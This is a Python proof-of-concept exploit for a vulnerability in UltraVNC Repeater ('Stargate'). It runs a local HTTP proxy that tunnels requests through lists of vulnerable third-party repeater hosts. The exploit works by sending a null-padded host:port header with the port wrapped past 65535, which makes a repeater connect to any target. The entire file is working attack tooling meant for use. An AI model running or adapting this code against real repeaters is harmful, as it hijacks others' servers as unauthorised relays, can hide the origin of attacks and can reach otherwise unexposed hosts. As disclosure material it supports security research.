#!/usr/bin/env python

# Stargate UltraVNC Repeater vulnerability  HTTP Proxy POC
# by Yonathan Klijnsma & Dan Tentler

# Code is based on https://code.google.com/archive/p/python-proxy/

import socket, thread, select, random
from optparse import OptionParser

STARGATES = None
BUFLEN = 8192
SUPPORTED_METHODS = ['GET', 'POST', 'HEAD']

class StargateConnectionHandler:
    def __init__(self, connection, address, timeout):
        global STARGATES, SUPPORTED_METHODS

        self.stargates = STARGATES
        self.client = connection
        self.client_buffer = ''
        self.timeout = timeout
        self.method, self.path, self.protocol = self.get_base_header()
        if self.method in SUPPORTED_METHODS:
            self.method_supported()
        self.client.close()
        self.target.close()

    def get_base_header(self):
        global BUFLEN 

        while 1:
            self.client_buffer += self.client.recv(BUFLEN)
            end = self.client_buffer.find('\n')
            if end != -1:
                break
        self.client_orig_buffer = self.client_buffer
        data = (self.client_buffer[:end+1]).split()
        self.client_buffer = self.client_buffer[end+1:]
        return data   

    def method_supported(self):
        self.path = self.path[7:]
        i = self.path.find('/')
        host = self.path[:i]
        path = self.path[i:]
        self.connect_to_stargate(host)
        self.target.send(self.client_orig_buffer)
        self.client_buffer = ''
        self.client_orig_buffer = ''
        self.process_connection()

    def connect_to_stargate(self, host):
        i = host.find(':')
        if i != -1:
            port = int(host[i+1:])
            host = host[:i]
        else:
            port = 80

        # Stargate connection
        selected_stargate = random.choice(self.stargates)
        stargate_host, stargate_port = selected_stargate.split(":")
        (soc_family, _, _, _, address) = socket.getaddrinfo(stargate_host, stargate_port)[0]
        self.target = socket.socket(soc_family)
        self.target.connect(address)

        # Wrap ports
        if len(str(port)) < 4:
            port += 65536

        # Build stargate connection buffer
        header = host + ':' + str(port)
        headerlen = len(header)
        multiplier = 250 - int(headerlen)
        padding = '\x00' * int(multiplier)
        comms = header + padding
        self.target.send(comms.encode())
        resp = self.target.recv(11).decode()

    def process_connection(self):
        global BUFLEN

        time_out_max = self.timeout/3
        socs = [self.client, self.target]
        count = 0
        while 1:
            count += 1
            (recv, _, error) = select.select(socs, [], socs, 3)
            if error:
                break
            if recv:
                for in_ in recv:
                    data = in_.recv(BUFLEN)
                    if in_ is self.client:
                        out = self.target
                    else:
                        out = self.client
                    if data:
                        out.send(data)
                        count = 0
            if count == time_out_max:
                break

def start_proxy(host='localhost', port=8080, timeout=60, stargates=None):
    global STARGATES

    if not stargates:
        print '[+] No stargate hosts specified. Exiting..'
        sys.exit()
    
    STARGATES = stargates.split(',')

    stargate_socket = socket.socket(socket.AF_INET)
    stargate_socket.bind((host, int(port)))
    stargate_socket.listen(0)

    print "[+] Stargate HTTP Proxy started and listening on %s:%s" % (host, port)
    print "[+] Loaded %i stargates for proxying purpose" % len(STARGATES)

    while 1:
        thread.start_new_thread(StargateConnectionHandler, stargate_socket.accept() + (timeout,))

if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("-s", "--stargates", dest="stargates", default=None,
                        help="List of comma seperated stargate IP:PORT combinations")
    parser.add_option("-a", "--address", dest="host", default="localhost",
                        help="Host to bind the proxy to")
    parser.add_option("-p", "--port", dest="port", default=8080,
                        help="Port to make the proxy listen on")

    (options, args) = parser.parse_args()

    if not options.stargates:
        parser.error("At least one stargate host needs to be specified with the -s or --stargates options")

    start_proxy(host=options.host, port=options.port, stargates=options.stargates)
